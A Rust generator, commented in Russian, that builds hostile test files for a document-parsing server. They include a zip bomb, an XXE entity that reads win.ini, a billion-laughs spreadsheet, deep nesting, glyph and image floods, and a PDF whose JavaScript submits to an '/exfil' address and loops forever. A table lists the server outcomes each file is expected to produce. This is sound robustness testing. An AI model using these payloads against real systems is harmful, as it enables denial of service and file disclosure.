//! Враждебные файлы набора (`hostile/`, спецификация M5 §6): не должны ронять сервер и
//! превышать лимиты — вложение `failed` с причиной или частичный результат.

use std::io::Write as _;

use zip::ZipWriter;

use super::ooxml::{self, Block, zip_options};
use super::pdf::{self, Doc, Line, Page};
use super::text::{Lang, Rng, paragraph};
use super::{Out, Profile};

/// Факт в тексте PDF с JavaScript: текст извлекается, JS не исполняется.
pub const J1: &str =
    "The backup tape rotation for the archive servers is performed every Thursday.";

const W_NS: &str = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";

/// DOCX с заданным `word/document.xml` (без стилей и сносок).
fn docx_raw(document: &[u8]) -> Vec<u8> {
    let ct = br#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#;
    let rels = br#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>"#;
    ooxml::zip_of(&[
        ("[Content_Types].xml".into(), ct.to_vec()),
        ("_rels/.rels".into(), rels.to_vec()),
        ("word/document.xml".into(), document.to_vec()),
    ])
}

/// zip-бомба: `word/document.xml` из `mib` МиБ пробелов внутри `w:t` (сжатие ≈ 1000:1),
/// пишется потоком, без копии в памяти.
fn zip_bomb(mib: usize) -> Vec<u8> {
    let mut w = ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let o = zip_options().large_file(true);
    w.start_file("[Content_Types].xml", o).expect("zip");
    w.write_all(br#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/></Types>"#).expect("zip");
    w.start_file("_rels/.rels", o).expect("zip");
    w.write_all(br#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>"#).expect("zip");
    w.start_file("word/document.xml", o).expect("zip");
    w.write_all(format!(r#"<w:document xmlns:w="{W_NS}"><w:body><w:p><w:r><w:t>"#).as_bytes())
        .expect("zip");
    let block = vec![b' '; 1 << 20];
    for _ in 0..mib {
        w.write_all(&block).expect("zip");
    }
    w.write_all(b"</w:t></w:r></w:p></w:body></w:document>")
        .expect("zip");
    w.finish().expect("zip").into_inner()
}

/// PDF из объектов-строк (корень — 1).
fn raw_pdf(objs: &[String]) -> Vec<u8> {
    let objs: Vec<Vec<u8>> = objs.iter().map(|s| s.clone().into_bytes()).collect();
    pdf::assemble(&objs, 1)
}

/// Страница с одной строкой Helvetica (объекты 1–4: каталог, страницы, страница, шрифт).
fn one_page_objs(extra_page: &str, content: &str) -> Vec<String> {
    vec![
        "<< /Type /Catalog /Pages 2 0 R >>".into(),
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>".into(),
        format!(
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R {extra_page} >>"
        ),
        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".into(),
        format!(
            "<< /Length {} >>\nstream\n{content}\nendstream",
            content.len()
        ),
    ]
}

/// Допустимые исходы враждебных файлов на сервере (сверка eval, спецификация M5 §7).
const ACCEPT: &[(&str, &[&str])] = &[
    (
        "hostile/zip-bomb.docx",
        &["done+truncated: max_ratio", "failed:parse_error"],
    ),
    ("hostile/xxe.docx", &["failed:parse_error: xml"]),
    ("hostile/billion-laughs.xlsx", &["failed:parse_error: xml"]),
    (
        "hostile/deep-nesting.docx",
        &["done+truncated: max_xml_depth", "failed:parse_error"],
    ),
    ("hostile/broken.pdf", &["failed:parse_error: pdf"]),
    (
        "hostile/truncated.pdf",
        &["done", "failed:parse_error: pdf"],
    ),
    ("hostile/js-action.pdf", &["done"]),
    ("hostile/deep-array.pdf", &["done", "failed:parse_error"]),
    ("hostile/glyph-flood.pdf", &["done+truncated: page_chars"]),
    ("hostile/huge-image.pdf", &["done+ocr"]),
    ("hostile/truncated.docx", &["failed:parse_error: zip"]),
];

pub fn all(o: &mut Out, seed: u64, p: Profile) {
    files(o, seed, p);
    for (path, alts) in ACCEPT {
        if o.files.iter().any(|f| f.0.path == *path) {
            o.set_accept(path, alts);
        }
    }
}

fn files(o: &mut Out, seed: u64, p: Profile) {
    let mut r = Rng::fork(seed, "hostile");
    // zip-бомба: 1 ГиБ (малый набор — 32 МиБ) пробелов в одной записи
    o.add(
        "hostile/zip-bomb.docx",
        "hostile",
        "truncated: max_ratio | failed",
        zip_bomb(if p.small { 32 } else { 1024 }),
    );
    // XXE: внешняя сущность в DOCTYPE
    let xxe = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><w:document xmlns:w="{W_NS}"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>"#
    );
    o.add(
        "hostile/xxe.docx",
        "hostile",
        "failed: parse_error (DTD)",
        docx_raw(xxe.as_bytes()),
    );
    // «миллиард смешков» в общих строках XLSX
    let mut lol = String::from(r#"<?xml version="1.0"?><!DOCTYPE sst [<!ENTITY lol "lol">"#);
    for i in 1..=9 {
        let prev = if i == 1 {
            "lol".to_string()
        } else {
            format!("lol{}", i - 1)
        };
        lol.push_str(&format!(
            r#"<!ENTITY lol{i} "{}">"#,
            format!("&{prev};").repeat(10)
        ));
    }
    lol.push_str(r#"]><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>&lol9;</t></si></sst>"#);
    let sheet = r#"<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row></sheetData></worksheet>"#;
    let wb = r#"<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="L" sheetId="1" r:id="rId1"/></sheets></workbook>"#;
    let wb_rels = r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/></Relationships>"#;
    let rels = r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>"#;
    let ct = r#"<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>"#;
    o.add(
        "hostile/billion-laughs.xlsx",
        "hostile",
        "failed: parse_error (DTD)",
        ooxml::zip_of(&[
            ("[Content_Types].xml".into(), ct.as_bytes().to_vec()),
            ("_rels/.rels".into(), rels.as_bytes().to_vec()),
            ("xl/workbook.xml".into(), wb.as_bytes().to_vec()),
            (
                "xl/_rels/workbook.xml.rels".into(),
                wb_rels.as_bytes().to_vec(),
            ),
            ("xl/worksheets/sheet1.xml".into(), sheet.as_bytes().to_vec()),
            ("xl/sharedStrings.xml".into(), lol.into_bytes()),
        ]),
    );
    // глубокая вложенность XML: 200 тыс. уровней `w:sdt/w:sdtContent` (предел 256)
    let depth = if p.small { 2_000 } else { 200_000 };
    let mut deep =
        format!(r#"<w:document xmlns:w="{W_NS}"><w:body><w:p><w:r><w:t>start</w:t></w:r></w:p>"#);
    deep.push_str(&"<w:sdt><w:sdtContent>".repeat(depth));
    deep.push_str("<w:p><w:r><w:t>deep</w:t></w:r></w:p>");
    deep.push_str(&"</w:sdtContent></w:sdt>".repeat(depth));
    deep.push_str("</w:body></w:document>");
    o.add(
        "hostile/deep-nesting.docx",
        "hostile",
        "failed: parse_error | truncated: max_xml_depth",
        docx_raw(deep.as_bytes()),
    );
    // PDF: заголовок и мусор
    let mut junk = b"%PDF-1.7\n".to_vec();
    junk.extend((0..64 * 1024).map(|_| (r.next_u64() & 0xff) as u8));
    o.add("hostile/broken.pdf", "hostile", "failed: parse_error", junk);
    // обрезанный PDF: первые 60 % обычного документа (без xref и trailer)
    let pages: Vec<Page> = (0..4)
        .map(|i| Page {
            lines: (0..30)
                .map(|k| Line {
                    x: 72.0,
                    y: 760.0 - 20.0 * k as f32,
                    size: 11.0,
                    text: format!("Truncated document page {} line {}", i + 1, k + 1),
                })
                .collect(),
            ..Page::default()
        })
        .collect();
    let full = pdf::build(&Doc {
        pages,
        open_action_js: None,
    });
    o.add(
        "hostile/truncated.pdf",
        "hostile",
        "done (восстановление xref) | failed",
        full[..full.len() * 6 / 10].to_vec(),
    );
    // PDF с JavaScript действия открытия: текст извлекается, JS не исполняется
    let text = format!(
        "{} {J1} {}",
        paragraph(&mut r, Lang::En, 1, 1),
        paragraph(&mut r, Lang::En, 1, 1)
    );
    let lines = super::text::wrap(&text, 451.0, |s| pdf::text_width(s, 11.0))
        .into_iter()
        .enumerate()
        .map(|(k, t)| Line {
            x: 72.0,
            y: 760.0 - 14.0 * k as f32,
            size: 11.0,
            text: t,
        })
        .collect();
    let js = pdf::build(&Doc {
        pages: vec![Page {
            lines,
            ..Page::default()
        }],
        open_action_js: Some(
            "app.alert('zam'); this.submitForm('http://127.0.0.1:9/exfil'); while(true){}".into(),
        ),
    });
    o.fact("j1", "hostile/js-action.pdf", "page:1".into(), J1);
    o.add(
        "hostile/js-action.pdf",
        "hostile",
        "done, JS не исполняется",
        js,
    );
    // глубокая вложенность массивов в словаре страницы
    let n = if p.small { 2_000 } else { 100_000 };
    let nested = format!("{}0{}", "[".repeat(n), "]".repeat(n));
    o.add(
        "hostile/deep-array.pdf",
        "hostile",
        "done | failed: parse_error (не parse_crash)",
        raw_pdf(&one_page_objs(
            &format!("/Junk {nested}"),
            "BT /F1 12 Tf 72 700 Td (deep array page) Tj ET",
        )),
    );
    // поток глифов: 400 тыс. символов на странице (предел PAGE_GLYPHS_MAX 262 144)
    let glyphs = if p.small { 5_000 } else { 400_000 };
    let mut content = String::from("BT /F1 4 Tf 10 830 Td 5 TL\n");
    let mut left = glyphs;
    while left > 0 {
        let k = left.min(200);
        content.push_str(&format!("({}) '\n", "x".repeat(k)));
        left -= k;
    }
    content.push_str("ET");
    o.add(
        "hostile/glyph-flood.pdf",
        "hostile",
        "done, truncated: page_chars",
        raw_pdf(&one_page_objs("", &content)),
    );
    // картинка 30000 × 30000 RGB (2,7 ГБ после распаковки): миниатюра — OOM рабочего процесса
    if !p.small {
        o.add(
            "hostile/huge-image.pdf",
            "hostile",
            "done (текста нет); превью thumb — parse_oom | parse_crash",
            huge_image_pdf(30_000),
        );
    }
    // обрезанный DOCX: половина архива, без центрального каталога
    let (ok, _) = ooxml::docx(&[Block::Para("x".into())]);
    let mut cut = ok.clone();
    cut.truncate(ok.len() / 2);
    o.add(
        "hostile/truncated.docx",
        "hostile",
        "failed: parse_error (zip)",
        cut,
    );
}

/// PDF с картинкой `side × side` DeviceRGB, поток FlateDecode из нулей.
fn huge_image_pdf(side: u32) -> Vec<u8> {
    use flate2::Compression;
    use flate2::write::ZlibEncoder;
    let mut z = ZlibEncoder::new(Vec::new(), Compression::default());
    let row = vec![0u8; side as usize * 3];
    for _ in 0..side {
        z.write_all(&row).expect("zlib");
    }
    let data = z.finish().expect("zlib");
    let mut objs: Vec<Vec<u8>> = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /XObject << /Im1 4 0 R >> >> /Contents 5 0 R >>".to_vec(),
    ];
    let mut img = format!(
        "<< /Type /XObject /Subtype /Image /Width {side} /Height {side} /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode /Length {} >>\nstream\n",
        data.len()
    )
    .into_bytes();
    img.extend_from_slice(&data);
    img.extend_from_slice(b"\nendstream");
    objs.push(img);
    let content = b"q 595 0 0 842 0 0 cm /Im1 Do Q";
    let mut c = format!("<< /Length {} >>\nstream\n", content.len()).into_bytes();
    c.extend_from_slice(content);
    c.extend_from_slice(b"\nendstream");
    objs.push(c);
    pdf::assemble(&objs, 1)
}
